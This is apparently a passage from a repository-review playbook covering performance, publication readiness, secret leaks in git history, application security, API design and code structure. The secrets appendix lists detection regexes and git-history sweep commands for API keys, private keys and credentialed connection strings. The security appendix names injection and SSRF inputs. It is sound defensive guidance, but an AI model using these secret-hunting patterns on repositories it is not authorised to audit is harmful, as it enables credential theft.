| 1 | Secrets and git history | secrets-and-git-history.md | Any git repo | Leaks are irreversible and worsen with each push; also decides if the repo can ever go public |
| 2 | Security (app-level) | security.md | Always | Injection, authn/authz, XSS, CSRF, SSRF, headers, uploads |
| 3 | Server and API | server-api.md | Any backend, route handlers, server actions, edge functions | Validation, errors, rate limits, auth boundaries, contracts |
| 4 | Database | database.md | Drizzle/Prisma/SQL/Mongo/etc. | Integrity, migrations, indexes, injection, access rules |
| 5 | AI integration | ai-integration.md | Any LLM/AI SDK or API call | Cost abuse, prompt injection, key exposure, unsafe output |
| 6 | Dependencies and framework currency | dependencies-and-currency.md | Always | Known CVEs, outdated majors, deprecated patterns, supply chain |
| 7 | UI, responsive, brand consistency | ui-responsive-brand.md | Any frontend | What bosses and clients see first |
| 8 | Accessibility | accessibility.md | Any frontend | Legal and quality baseline; also improves SEO and UX |
| 9 | Performance | performance.md | Any frontend or API | Core Web Vitals, bundle, queries, caching |
| 10 | Structure and maintainability | structure-and-maintainability.md | Always | Folder layout, boundaries, naming, dead code, types |
| 11 | Testing, CI, observability | testing-ci-observability.md | Always | Whether quality is enforced automatically |
| 12 | Public-readiness and exposure | public-readiness.md | Before open-sourcing, sharing, or showing to a client; also useful otherwise | Licenses, README, leftovers, history, metadata, what a stranger can see |

Notes on ordering:

- Public-readiness comes last in the default order because it uses earlier findings, but if the person says "we will make it public soon", move it right after domain 1 and 2.
- If the person's main worry is what the boss sees (design, responsiveness), it is fine to start with domain 7, but still run domain 1 early: it is cheap and the most damaging when missed.
- Large repos (monorepos): run each domain per package only when packages differ in stack (for example `apps/web` and `apps/api`); otherwise scope once across the repo.
- Keep each domain to a size one sub-agent can finish well. If a domain is huge (for example 200 routes), split it in the review map ("Server/API part 1: auth and user routes", "part 2: admin and webhooks") rather than letting the sub-agent skim.

## Suggested stack-to-domain hints

- Next.js / React Server Components / server actions: server actions are public HTTP endpoints; check authz inside each action, `NEXT_PUBLIC_` leakage, caching and revalidation behavior, middleware used as the only auth layer.
- Drizzle + Postgres (Neon/Supabase/Vercel Postgres): migrations committed and applied in a controlled way, `drizzle-kit push` not used against production, raw `sql` fragments, pooling in serverless, row-level security if the DB is exposed to clients.
- Vercel AI SDK / OpenAI / Anthropic / Gemini: keys server-side, streaming route protection, per-user rate and spend limits, prompt injection and tool permissions, markdown/HTML rendering of model output.
- Tailwind / shadcn / CSS-in-JS: design tokens vs hard-coded values, breakpoints used consistently, dark mode, focus states.
- Any app with a UI that calls an API: error exposure. Technical errors shown to users (`error.message` in toasts, raw stack in error pages) are checked in UI (4b), server/API (3b), and security (J); a failure that shows nothing is checked too.
- Docker/CI: secrets in build args and layers, base image age, running as root, CI tokens scope.


---

# APPENDIX A-performance

# Playbook: Performance

Role: performance engineer. Measure where possible; reason about cost where measurement is not possible, and label which is which. Check current Core Web Vitals thresholds and the framework's current performance guidance before judging (metrics and recommended patterns evolve; as of recent years the vitals are LCP, INP, CLS).

Targets to compare against (verify current values): LCP <= 2.5 s, INP <= 200 ms, CLS <= 0.1 at the 75th percentile on mobile.

## A. Measurement (do what the sandbox allows, state the rest as not measured)

1. Production build size report (`next build`, `vite build --report`, `rollup-plugin-visualizer`, `source-map-explorer`, `webpack-bundle-analyzer`). Build into a temp output dir, do not modify the project.
2. Lighthouse (mobile preset, throttled) on key pages if a headless browser is available; otherwise give the commands for the person to run and what to look for.
3. If a database is reachable in dev: query timings and `EXPLAIN ANALYZE` for list pages (see database domain).
4. Real-user data if present (Vercel Analytics/Speed Insights, Sentry, Search Console CrUX); otherwise recommend adding it.

## B. Frontend load performance

1. Bundle size: total JS shipped per route; heavy libraries (moment, lodash full import, chart libs, icon packs imported whole, markdown/syntax highlighters, PDF libs) lazy-loaded or replaced; tree-shaking works (ESM imports, `sideEffects` flags); duplicate packages/versions in the bundle.
2. Code splitting by route and by interaction (dynamic `import()`/`next/dynamic`/`React.lazy`) for modals, editors, charts, admin areas.
3. Server vs client components: `"use client"` pushed down to leaves; large data not serialized into client props; no client-side fetching of data that could be rendered on the server; avoid waterfalls (sequential fetches that could be parallel; `Promise.all`, preloading).
4. Images: modern formats (AVIF/WebP), correct dimensions via `srcset`/`sizes` or the framework image component, `priority`/`fetchpriority` for the LCP image only, lazy-load below the fold, no multi-MB hero images, SVG optimized.
5. Fonts: self-hosted or `next/font`, subset, `font-display: swap`, preload only critical, limited weights; variable fonts for multiple weights; large scripts (Ethiopic/CJK) subsetted.
6. CSS: unused CSS purged, critical CSS inline or small; no render-blocking third-party CSS; avoid huge CSS-in-JS runtime cost where it hurts.
7. Third-party scripts (analytics, chat, tag managers, fonts, maps): count and cost, `async`/`defer`, load after interaction, self-host where license allows.
8. Layout shift (CLS): dimensions reserved for images/embeds/ads, no content injected above existing content, skeletons match final layout, font swap metrics (`size-adjust`).
9. Responsiveness (INP): long tasks on main thread, heavy event handlers, large lists not virtualized (`react-window`/`@tanstack/virtual`), expensive renders (missing memoization where profiling shows need, state too high in the tree, context re-render storms), debounce/throttle on search and scroll.
10. Hydration cost and mismatches; avoid huge JSON blobs inlined in HTML.
11. Caching and delivery: hashed static assets with long `Cache-Control: immutable`; HTML caching strategy; CDN used; compression (gzip/brotli) on; HTTP/2 or 3; preconnect only to critical origins; service worker correctness if present.
12. Low-bandwidth and low-end device consideration: audience context (for example mobile data in emerging markets) changes priorities; check performance at slow 4G and mid-range CPU throttling and keep the total initial JS budget small.

## C. Backend and data performance

1. N+1 queries, missing indexes, unbounded lists, `select *`, heavy joins on request path (database domain has details).
2. Caching layers: HTTP cache headers, framework caching/revalidation (verify semantics for the version), in-memory/Redis cache for expensive reads with invalidation strategy; stale data bugs vs freshness.
3. Expensive work in the request path (image processing, PDF generation, AI calls, large exports) moved to background jobs/queues with status endpoints.
4. Serverless: cold start size (bundle size, heavy imports at top level), connection pooling, region placement near the database (cross-region DB calls add 100+ ms each), edge vs node runtime choice.
5. Payload size: JSON responses trimmed, compression, pagination, GraphQL query depth limits, avoid over-fetching/under-fetching.
6. Concurrency: unbounded `Promise.all`, sequential `await` in loops, blocking sync calls (`fs.readFileSync`, heavy JSON/regex/crypto on the event loop), memory leaks (listeners, caches without eviction, timers).
7. Streaming for long outputs (AI, large files) instead of buffering.

## D. Build and developer-performance

Build time and CI time reasonable; incremental builds and caches (turbo, nx, framework cache); dev dependencies not in production bundle; monorepo task graph; large assets not in git (use LFS/CDN).

## E. Typical junior mistakes

- Importing a whole library for one function; whole icon packs; `moment` in 2026.
- 4000 px photographs rendered at 400 px.
- Everything marked `"use client"`; data fetched in `useEffect` after load with spinners.
- Fetches in sequence that could run in parallel; queries inside `.map`.
- No pagination; rendering thousands of DOM nodes.
- Layout jumping because images have no size.
- Third-party widgets added "just to try" and never removed.

## Habits to teach

Set a performance budget (JS KB per route, LCP target) and check it in CI; look at the bundle report before every release; measure on a mid-range phone, not only on your laptop; fix the biggest bottleneck first rather than micro-optimizing.


---

# APPENDIX A-public-readiness

# Playbook: Public-readiness and exposure

Role: release manager and security reviewer answering one question: **"If this repo became public (or was shared with a client or an outsider) tomorrow, what would a stranger see and be able to do?"** Use the findings of earlier domains (secrets/history, security, dependencies) as input rather than redoing them; read their `report.md` files if they exist and cite them.

A private repo is only private until someone changes a setting, adds a collaborator, forks it, leaks a token, or hands over a laptop. Review it as if the audience is the internet.

## A. Everything in history, not only the latest code

1. Carry over every leak from the secrets-and-history report as a blocker for publication until rotated, and confirm rotation status with the person. A key removed from the latest files but present in old commits counts as published the moment the repo is public.
2. Other sensitive content in history: internal URLs/hostnames/IPs, customer data samples, database dumps, personal data in fixtures, screenshots with private info, internal docs/meeting notes, TODOs with names or credentials, exported chats, `.sql` backups.
3. Decide with the person: (a) publish the full history after cleanup (rewrite + rotation), or (b) publish a fresh repository with a squashed history (safest when history is messy), keeping the private one for reference. Explain trade-offs: (a) keeps contribution history but risks a missed leak; (b) loses history but resets exposure.
4. Check all branches, tags, stashes, pull-request refs (`refs/pull/*` on GitHub), and forks. Deleting a branch does not remove its commits from forks/caches.

## B. Metadata and identity exposure

1. Commit author names and emails (personal emails, real names, employer domains) versus what the person wants public; `.mailmap`; GitHub "keep my email private" settings.
2. Internal references in code and docs: company names, internal ticket IDs, Slack/Jira/Notion links, staging/prod hostnames, cloud account IDs, bucket names, internal IP ranges, server paths with usernames (`/Users/<name>/`), source-map paths.
3. `package.json`: `author`, `repository`, `homepage`, `bugs`, `private: true` (prevents accidental npm publish) vs intended `publishConfig`, `files` allow-list for published packages.
4. Analytics/tracking IDs, third-party site keys (publishable keys are fine if they are meant to be public; confirm each), Sentry DSNs, Google Maps keys without referrer restrictions (restrict them), OAuth client IDs (fine) vs client secrets (not fine).
5. Infrastructure files exposing topology: Terraform state, Kubernetes manifests with real hostnames, Docker compose with internal service names and default passwords, CI config with environment names and URLs.

## C. Legal and licensing

1. A `LICENSE` file chosen deliberately (MIT/Apache-2.0/GPL/proprietary "all rights reserved"); without a license, default copyright applies and others cannot legally reuse it; check compatibility with dependency licenses (dependencies domain report).
2. Third-party assets: fonts, images, icons, stock photos, videos, templates, datasets, and copied code snippets (Stack Overflow, tutorials, AI-generated code with unclear provenance) each have a license that permits public redistribution; attribution files (`NOTICE`, credits).
3. Brand and trademarks: logos, company names, client names, customer data; employer or client IP agreements (work done for a client or employer may belong to them); ask the person to confirm permission.
4. Privacy: any real personal data in fixtures/tests/screenshots; privacy policy and terms for the deployed app if it collects data.
(Do not give legal advice; flag items and recommend legal review where stakes are high.)

## D. First impression for a stranger or a reviewer

1. README quality: what, why, screenshots/GIF, live demo link, tech stack, setup in 5 steps that work from a clean clone, env table, scripts, project structure, roadmap/status, license, contact/contributing.
2. Repo hygiene on the front page: description and topics set, no junk files at the root, sensible `.gitignore`, no giant binaries, no committed `node_modules`/build output, consistent naming, tidy `docs/`.
3. Code of conduct, `CONTRIBUTING.md`, `SECURITY.md` (how to report vulnerabilities), issue/PR templates, `CODEOWNERS` if collaborating.
4. Embarrassing leftovers: commented-out credentials, "TODO: fix this hack", profanity in comments/commit messages, insults about clients/colleagues, personal notes, abandoned experiments, test accounts with real-looking emails.
5. Default or template content: framework default README/logo/favicon, placeholder text, broken links.

## E. What the running deployment exposes

(Only through read-only observation of what is in the repo and, if the person gives a URL, what is publicly visible without logging in or attacking anything. Do not probe or scan systems you are not authorized to test; ask first.)
1. Public source maps and debug builds exposing original source and comments; `NEXT_PUBLIC_*`/client env values that are secrets; `/.env`, `/.git/`, `/api/debug`, `/_next/static` contents; directory listing; public storage buckets; GraphQL introspection and API docs for private APIs; admin panels at guessable URLs; verbose errors.
2. `robots.txt` and sitemap: do not rely on `robots.txt` to hide anything sensitive (it advertises paths); staging sites indexed by search engines (`noindex`, auth) ; preview deployments public.
3. Seed/demo accounts and default credentials still active; test payment keys vs live keys correctly separated.
4. DNS/subdomains pointing to deleted services (takeover risk); expired certificates; email security (SPF/DKIM/DMARC) if the domain sends mail.

## F. Platform settings to recommend

Enable secret scanning and push protection; branch protection and required reviews; 2FA for all collaborators; dependency alerts; least-privilege collaborator roles; disable force-push on main after cleanup; deploy keys scoped read-only; Actions permissions restricted; review of connected apps/tokens.

## G. Decision output

End the report with a **go/no-go table**: blockers (must fix before public), should-fix, nice-to-have, plus the recommended publication path (clean history vs fresh repo) and a final pre-flight checklist the person can tick.

## Typical junior mistakes

- Assuming "it is private so keys in the code are fine".
- Removing a leaked file in a new commit and believing the problem is solved.
- Publishing with personal email in every commit; real customer data in test fixtures.
- Leaving staging public and indexed; leaving source maps on.
- No license, or copying a license without understanding dependency obligations.
- Using client or employer code/branding in a public portfolio piece without permission.

## Habits to teach

Write every commit as if it will be public; keep secrets out of git from the first commit; do a pre-publication checklist and a fresh-clone test; prefer a clean new repo over a messy history when in doubt.


---

# APPENDIX A-secrets-and-git-history

# Playbook: Secrets and git history

Role: security engineer doing a pre-publication secrets sweep.

The core lesson: **deleting a secret from the current files does not remove it from git history.** Every commit is a permanent copy. A repo that is private today can become public, be forked, be cloned by a contractor, or be exposed by a leaked token, and then every old commit is readable. The review therefore covers the whole history, from the first commit to HEAD, not just the working tree.

Never print secret values. Record location, type, first 4 characters at most.

## A. Working tree

1. Tracked env files: `git ls-files | grep -iE '(^|/)\.env'` ; anything except `.env.example`/`.env.sample` is suspect. Also `*.pem`, `*.key`, `id_rsa*`, `*.p12`, `*.pfx`, `service-account*.json`, `credentials*.json`, `*.tfvars`, `terraform.tfstate`, `.npmrc` with `_authToken`, `.pypirc`, `.netrc`, `.aws/`, `firebase-adminsdk*.json`, `*.keystore`.
2. Content patterns in tracked files (use ripgrep, exclude lockfiles and `node_modules`):
   - Provider prefixes: `sk-`, `sk-ant-`, `sk_live_`, `pk_live_`, `rk_live_`, `whsec_`, `AKIA[0-9A-Z]{16}`, `ASIA[0-9A-Z]{16}`, `ghp_`, `gho_`, `github_pat_`, `glpat-`, `xox[baprs]-`, `AIza[0-9A-Za-z_-]{35}`, `ya29\.`, `SG\.`, `key-[0-9a-f]{32}`, `eyJ` (JWTs), `-----BEGIN (RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----`.
   - Connection strings with credentials: `postgres(ql)?://[^:]+:[^@]+@`, `mysql://`, `mongodb(\+srv)?://[^:]+:[^@]+@`, `redis://:[^@]+@`.
   - Assignments: `(api[_-]?key|secret|token|password|passwd|private[_-]?key|client[_-]?secret|auth)["']?\s*[:=]\s*["'][^"']{8,}`.
   - Hard-coded test keys "just for a sample test" are the classic junior mistake; inspect `test`, `examples`, `scripts`, `playground`, `*.http`, `*.rest`, Postman/Insomnia exports, notebooks, `docker-compose*.yml`, `README` snippets.
3. Client-exposed variables: any `NEXT_PUBLIC_*`, `VITE_*`, `PUBLIC_*`, `EXPO_PUBLIC_*`, `REACT_APP_*` holding something that must be private (AI keys, DB URLs, service role keys, admin tokens). These are shipped to every browser by design.
4. `.gitignore` covers `.env*` (with `!.env.example`), key files, local DBs (`*.sqlite`, `*.db`), `.vercel`, `.next`, `coverage`, IDE folders, OS files. Missing entries are findings even if no leak exists yet.
5. Build artifacts committed (`dist`, `.next`, `.output`, source maps) can contain inlined env values. Grep them.
6. Docker: secrets in `ARG`/`ENV`, `COPY .env`, `.dockerignore` missing.
7. CI files: secrets echoed, `pull_request_target` with checkout of untrusted code, tokens in plain text, over-broad `permissions`.

## B. Full history (every commit, every branch)

Run these from the repo root. Use `--all` so other branches and tags are included, and also check `git stash list` and `git reflog` for dangling commits.

1. Was any env or key file ever added?
   `git log --all --diff-filter=A --name-only --pretty=format:'%h %ad %s' --date=short -- '*.env' '.env*' '*.pem' '*.key' '*credentials*' '*secret*'`
   Then for each hit check whether it was later deleted (`--diff-filter=D`): deleted still means exposed.
2. Pattern sweep across all patches (can be slow; narrow with `-G`/`-S`):
   `git log --all -p -G'(sk-[A-Za-z0-9]{20,}|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|-----BEGIN [A-Z ]*PRIVATE KEY-----|postgres(ql)?://[^ ]+:[^ ]+@)' --pretty=format:'COMMIT %h %ad' --date=short | grep -E 'COMMIT|<pattern>'`
   Redact output before writing anything down.
3. Use a dedicated scanner when installable, because they handle entropy and hundreds of provider formats: `gitleaks detect --source . --log-opts="--all" --redact` or `trufflehog git file://. --only-verified`. If the network allowlist blocks the install, fall back to the manual sweeps above and say the scanner was not available. Never run "verified" checks that send the secret to the provider unless the person agreed; default to pattern-only detection.
4. Timeline: for each leak, find the first commit that introduced it (`git log -S'<first 6 chars>' --all --oneline`), the commit that removed it, and how many commits later. A secret that stayed for 5 more commits after the "fix" is still in all of them. Report the exposure window.
5. Was the repo ever public, forked, or pushed to more than one remote? (`git remote -v`; ask the person.) If yes, assume the secret is compromised.
6. Large/odd blobs: `git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(objectsize) %(rest)' | sort -k3 -n -r | head -20` ; look for dumps, `.sql`, `.env` backups, zipped configs, exported chat/logs with tokens.
7. Commit metadata exposure: author emails (personal vs work), names, internal URLs or ticket IDs in messages, "temp"/"fix key"/"remove env" messages that hint at a past leak (`git log --all --oneline | grep -iE 'env|key|secret|token|password|cred|remove'`).
8. Submodules and vendored folders with their own history or `.git` directories accidentally committed.

## C. Triage each leak

For every confirmed or likely secret:
- Is it a real credential or a placeholder/example? (Check format validity; do not call the provider unless the person allows.)
- What can it do? (AI key = spend money; DB URL = read/write all data; service-role key = bypass RLS; cloud keys = anything in scope.)
- Is it still valid? Only the person can check in the provider's dashboard; mark as "assume valid until rotated".

## D. Remediation order to put in the report (this order matters)

1. **Rotate/revoke first**, in the provider dashboard. This is the only step that actually fixes the leak. Rewriting history without rotating leaves a live key that may already have been scraped (bots scan new commits within minutes).
2. Check provider usage/audit logs for the exposure window for abuse.
3. Put the replacement in environment variables or a secrets manager (platform secrets, Doppler, 1Password, Vault), never in files that are tracked.
4. Optionally rewrite history to remove the file/values (`git filter-repo --path .env --invert-paths`, or BFG), then force-push all branches and tags, ask collaborators to re-clone, and expire caches (GitHub support can purge cached views/forks). Warn that this does not help for anything already cloned or forked, which is why step 1 comes first.
5. Prevent repeats: `.gitignore` entries, `.env.example` with fake values, pre-commit secret scan (gitleaks/secretlint via husky/lefthook), CI secret scan, GitHub push protection and secret scanning (free on public repos, available on private with the right plan), least-privilege and scoped keys with spend limits, short-lived tokens.

## E. Habits to teach (junior-level)

- Never paste a real key into any file that is not git-ignored, even "temporarily", even in a test.
- Run `git status` and `git diff --staged` before every commit; read what is going in.
- Add the ignore rule and the `.env.example` on day one of a project, before the first commit.
- If a secret is ever committed: rotate immediately, then clean up. Do not "just delete it in the next commit".
- Use different keys for dev and production, with limits, so a leak has a small blast radius.


---

# APPENDIX A-security

# Playbook: Application security

Role: application security engineer. Think like an attacker who has the source and a browser. Map the **attack surface** first (every entry point), then check each against the classes below. Secrets and history are a separate domain; dependency CVEs are another.

Before starting, check the official security guidance for the exact framework and major version in the stack profile (for example the framework's "data security", "authentication", and "headers" docs) and today's OWASP Top 10 and ASVS. Framework defaults and recommended patterns change between versions; do not assume.

## A. Attack surface inventory (do first, put in the checklist)

List every: HTTP route/handler, server action, RPC/tRPC procedure, GraphQL resolver, webhook receiver, cron/queue handler, websocket event, file upload endpoint, redirect/callback URL, public static asset folder, admin/debug/health/metrics route, and any `NEXT_PUBLIC`/client-exposed config. For each: who can call it (anonymous, user, admin, service), what input it takes, what it touches (DB, files, network, AI).

## B. Authentication

1. Auth library used correctly and up to date; no home-made crypto or token schemes.
2. Passwords: hashed with argon2id/bcrypt/scrypt with sane cost; never reversible, never logged; reset flows use single-use, expiring, hashed tokens; no user enumeration (same message/time for "no such user" and "wrong password").
3. Sessions/JWT: secure random secrets from env, httpOnly + Secure + SameSite cookies, sensible expiry, rotation on login/privilege change, logout invalidates server-side; JWT `alg` pinned, `none` rejected, no sensitive data in payload; tokens not in localStorage if XSS is a risk.
4. Brute-force protection: rate limit and lockout/backoff on login, signup, reset, OTP; OTPs are short-lived and attempt-limited.
5. OAuth: `state`/PKCE used, redirect URIs exact-match, tokens stored safely.
6. MFA available for admin accounts, if the product warrants it.

## C. Authorization (the most common serious bug)

1. Every protected route and **every server action / API handler** checks the session itself. Middleware or UI hiding alone is not protection: server actions and API routes can be called directly.
2. Object-level checks (IDOR/BOLA): for any `/:id` or `id` in the body, the query is scoped to the current user/tenant (`where id = ? AND userId = ?`). Look at every read, update, delete.
3. Function-level: admin-only operations check role on the server. Roles are not taken from client input or unsigned cookies.
4. Mass assignment: handlers do not spread request bodies into DB writes (`db.update(users).set(body)`); allow-list fields; `role`, `isAdmin`, `userId`, `price` can never come from the client.
5. Multi-tenant isolation: tenant id comes from the session, not the request.
6. Client-trusted business logic: prices, discounts, quotas, "is paid" flags computed or verified on the server.

## D. Injection

1. SQL: all queries parameterized. In Drizzle, `sql` template tags parameterize interpolations, but `sql.raw()`, string concatenation, or building identifiers/`ORDER BY`/`LIMIT` from input does not. In other ORMs search `$queryRaw`, `.raw(`, `execute(` with template strings. NoSQL: operator injection (`{ "$ne": null }`) via unvalidated JSON.
2. Command injection: `exec`, `execSync`, `spawn` with `shell: true`, `child_process` with user input; use argument arrays and allow-lists.
3. Path traversal: file reads/writes/downloads built from user input (`../`), `res.sendFile`, static serving of user paths; normalize and confine to a base dir.
4. Template/expression injection: `eval`, `new Function`, `vm`, server-side template with user data, dynamic `import()` of user paths.
5. LDAP/XPath/header/log injection: newline injection in headers, emails (`\r\n` in subject/to), logs.
6. Deserialization of untrusted data (`pickle`, `yaml.load`, `node-serialize`, unsafe JSON revivers).

## E. XSS and client-side

1. Search for `dangerouslySetInnerHTML`, `innerHTML`, `v-html`, `{@html}`, `document.write`, `insertAdjacentHTML`, `bypassSecurityTrust*`. Each must render sanitized content (DOMPurify or equivalent) or constants.
2. Markdown/rich-text rendering (including AI output and user comments): sanitized, links `rel="noopener noreferrer"`, `javascript:` URLs blocked.
3. URLs from user input used in `href`/`src`/`window.location`/`redirect()` validated (open redirect and `javascript:`).
4. `postMessage` handlers check `event.origin`.
5. CSP: a Content-Security-Policy header exists, no blanket `unsafe-inline`/`unsafe-eval` without justification, nonces/hashes where possible.
6. Third-party scripts: pinned, minimal, with SRI where feasible.

## F. CSRF, CORS, cookies

1. State-changing requests protected: SameSite cookies plus CSRF tokens or origin checks for cookie-auth. (Some frameworks add origin checks to server actions; verify rather than assume.)
2. CORS: no `*` with credentials, no reflecting arbitrary `Origin`, allow-list of origins, minimal methods/headers.
3. GET requests do not change state.

## G. SSRF and outbound requests

1. Any server-side fetch to a user-supplied URL (webhooks, link previews, image proxy, "import from URL", AI tool fetchers): allow-list hosts, block private/link-local ranges (127.0.0.0/8, 10/8, 172.16/12, 192.168/16, 169.254.169.254 cloud metadata, IPv6 equivalents), disable or re-validate redirects, set timeouts and size caps.
2. Image optimizer / `remotePatterns` / `domains` not wildcarded.

## H. Files and uploads

Type checked by content (magic bytes) not just extension/MIME header; size limits; random server-generated names; stored outside the web root or in object storage with private ACLs; served with correct `Content-Type` and `Content-Disposition`; no SVG/HTML served inline from user content; virus scan if relevant; signed, expiring URLs for private files.

## I. Security headers and transport

HSTS, `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `Permissions-Policy`, frame protection (`frame-ancestors` in CSP or `X-Frame-Options`), cache headers on authenticated responses (`Cache-Control: no-store`), cookies `Secure`. HTTPS only, no mixed content. Remove `X-Powered-By`. Compare against securityheaders.com-style expectations.

## J. Data protection and privacy

1. Sensitive fields (passwords, tokens, PII) never returned in API responses or serialized to the client; select only needed columns (DTOs).
2. Logs: no passwords, tokens, full card numbers, AI prompts with PII; error responses do not leak stack traces, SQL, file paths, or internal hostnames in production. Also check what the user's screen can display from those errors: a technical message shown in the UI is an information leak (it tells an attacker the database, ORM, framework, and table names) and a bad user experience. See the error exposure checks in the UI playbook (4b) and server/API playbook (3b) and treat a leak of stack traces, SQL, or secrets in a user-visible error as at least Medium, High if it reveals secrets or internal structure of sensitive systems.
3. Encryption at rest for sensitive fields where needed; backups; data retention and deletion path; analytics and third-party SDK data flows.
4. Debug and dev leftovers: debug routes, GraphQL introspection/playground in production, verbose errors, `console.log` of secrets, `NODE_ENV` checks, seed users with default passwords, test accounts, source maps publicly served if they expose internal code.

## K. Abuse and availability

Rate limiting on expensive and unauthenticated endpoints; request body size limits; pagination caps (`limit=1000000`); regex DoS on user input; zip bombs; unbounded loops; timeouts on external calls; queue backpressure.

## L. Webhooks and integrations

Signature verification (Stripe `whsec_`, GitHub, etc.) using the raw body and constant-time compare; replay protection (timestamp/idempotency); idempotent handlers.

## M. Supply chain touchpoints (details in the dependencies domain)

Install scripts, lockfile integrity, CI actions pinned by SHA, `npx` of unpinned packages in scripts.

## Typical junior mistakes to look for specifically

- Auth check only in the React component or middleware, none in the API route or server action.
- `req.body` spread straight into a DB update.
- Fetching with `id` from the URL without checking the owner.
- AI or DB key in a `NEXT_PUBLIC_` variable "because it did not work otherwise".
- `cors({ origin: '*' })` copied from a tutorial and left in.
- Returning the whole user row (including `passwordHash`) from an endpoint.
- Trusting `localStorage` flags like `isAdmin`.
- Verbose error handler that sends `err.stack` to the client, or UI code that prints `error.message` to the user.

## Habits to teach

Threat-model each new endpoint with three questions (who can call it, what input can they send, what can it touch); validate at the boundary with a schema; authorize on the server for every action; deny by default; keep a short security checklist in the pull-request template.


---

# APPENDIX A-server-api

# Playbook: Server and API

Role: senior backend engineer. Focus on correctness, robustness, and contracts. Exploit-style problems belong to the security domain; note them as handoffs.

## A. Boundaries and validation

1. Every handler validates input at the edge with a schema (zod/valibot/arktype/typebox or framework equivalent): body, query, params, headers, form data, cookies. Types alone (TypeScript) do not validate runtime data.
2. Validation covers type, format, length/size, ranges, enums, nested objects, array lengths. Unknown keys are stripped or rejected.
3. Output is shaped explicitly (response DTO), not "whatever the DB returned".
4. File uploads and webhooks use the raw-body and size limits appropriate to them.

## B. Error handling

1. Consistent error shape and status codes (400 validation, 401 unauthenticated, 403 forbidden, 404 not found, 409 conflict, 422, 429, 5xx). No 200 with `{ error }`.
2. No empty `catch {}`; no swallowed promise rejections; no `throw` of strings; errors keep their cause.
3. Central error handler; user-facing messages are safe, internal details go to logs only.
3b. **Error contract with the UI.** The API returns a stable, safe error shape (for example `{ code, message, requestId, fieldErrors? }`) where `message` is written for end users and `code` lets the UI choose its own text. Check that responses never contain `err.message` from the DB driver/ORM, provider SDK, or `fetch` failure, no stack traces, no SQL, no file paths, and no `err.stack` outside development; that the production error handler differs from the dev one; that every error response carries a `requestId` that also appears in the logs; and that server actions return friendly errors instead of letting raw exceptions bubble to the client. In the report, list each route or action that leaks technical detail, with the line.
4. Async handlers always awaited; no floating promises (`@typescript-eslint/no-floating-promises`).
5. Failure paths for external services (DB down, AI provider 429/500, payment API timeout) are handled: timeouts, retries with backoff and jitter only for idempotent operations, circuit-breaking or graceful degradation.

## C. Data consistency

1. Multi-step writes are in a transaction; money/inventory/quotas use atomic updates or row locks, not read-then-write in app code (race conditions, double spend).
2. Idempotency for payment, webhook, and "create" endpoints that clients may retry (idempotency keys, unique constraints).
3. Concurrency: optimistic locking or version columns where users edit the same record.
4. Side effects (emails, charges) happen after the commit, or via an outbox, not inside a transaction that may roll back.

## D. API design and contracts

1. Consistent naming, plural resources, correct verbs; GET is safe and idempotent.
2. Pagination on every list (cursor or limit/offset with a hard cap); filtering and sorting allow-listed.
3. Versioning or a change policy; documented contract (OpenAPI, tRPC types, or typed client); breaking changes noticed.
4. Dates in ISO 8601 UTC; money as integer minor units or decimal type, never float; IDs opaque (UUID/ULID) where enumeration matters.
5. Rate limit headers and `429` with `Retry-After` on public endpoints.

## E. Framework-specific correctness (verify against current docs for the version in use)

- Next.js/React server frameworks: server action vs route handler choice; caching and revalidation semantics (stale data after mutation); `export const dynamic`/runtime choice (edge vs node: edge cannot use some libraries); cookies/headers access in cached contexts; redirects inside try/catch swallowed; environment variables read at build vs request time.
- Express/Fastify/Hono/Nest: middleware order (auth before routes, error handler last), `trust proxy` configured behind a proxy, body parser limits, async error propagation in Express 4.
- Serverless: cold starts, connection pooling, execution time limits, filesystem is read-only/ephemeral, background work after response being killed.

## F. Configuration and environment

1. Env vars validated at startup with a schema (fail fast if missing); one config module, not `process.env.X` scattered through the code.
2. Separate dev/staging/production values; no production defaults in code; feature flags documented.
3. Graceful shutdown, health and readiness endpoints that do not leak details.

## G. Logging, observability hooks

Structured logs with request IDs; log level appropriate; no PII/secrets; errors captured to a tracker (Sentry or equivalent) with source maps handled safely. (Deeper in testing/CI/observability domain.)

## H. Background jobs and cron

Jobs idempotent, retried safely, with dead-letter handling; schedule endpoints protected (cron secret) so outsiders cannot trigger them; long jobs not run inside request handlers.

## I. Typical junior mistakes

- Business logic duplicated across handlers; handlers with 200+ lines mixing parsing, DB, and formatting.
- Reading `await req.json()` and using fields directly.
- `Promise.all` over thousands of items hitting the DB or an API at once.
- Using `float` for money; using local time zones in storage.
- Sequential `await` inside loops where batching is possible (also a performance issue).
- Missing `await` leading to silent failures.
- "Works on my machine" env assumptions (hard-coded `localhost` URLs, absolute file paths).

## Habits to teach

Write a schema before the handler body; return typed results; make each handler: parse -> authorize -> act -> respond; keep the service layer free of HTTP concerns; test the failure path as often as the success path.


---

# APPENDIX A-structure-and-maintainability

# Playbook: File structure and maintainability

Role: staff engineer reviewing whether a new teammate could understand, change, and ship this repo safely. Also look at *history* (how the code got here), not only the final tree.

## A. Repository layout

1. Top-level clarity: obvious entry points; `src/` or framework-conventional folders; no junk at the root (`test.js`, `temp/`, `copy of`, `final_v2`, scratch files, screenshots, zips, IDE files).
2. Organization principle is consistent: by feature/domain (preferred for growing apps) or by layer; not a mix that makes imports hard to guess. Components, hooks, lib, server, db, config, types, tests have predictable homes.
3. Boundaries: server-only code cannot be imported by client code (use `server-only`/package boundaries/lint rules); UI does not import DB; DB access is behind a data layer; shared types in one place; circular imports (`madge`/`dpdm`).
4. Monorepo: package boundaries, shared configs, workspace protocol, task runner, no deep relative imports across packages (`../../../`).
5. Path aliases (`@/`) consistent with `tsconfig` and the bundler.
6. Generated files and build output not committed unless deliberate; large binaries not in git; `.gitattributes` for line endings/LFS where relevant.

## B. Code health

1. File and function size: files over ~300-400 lines, functions over ~50 lines, components with many responsibilities; deeply nested conditionals; god objects/util dumping grounds (`utils.ts` with 80 unrelated functions).
2. Duplication: copy-pasted blocks and near-duplicate components/routes (`jscpd`); constants and magic numbers/strings; repeated fetch/validation code that should be a shared function.
3. Dead code: unused exports, files, dependencies, feature flags, commented-out blocks (`knip`, `ts-prune`, ESLint `no-unused-vars`); stale TODO/FIXME/HACK count and age (`git blame`).
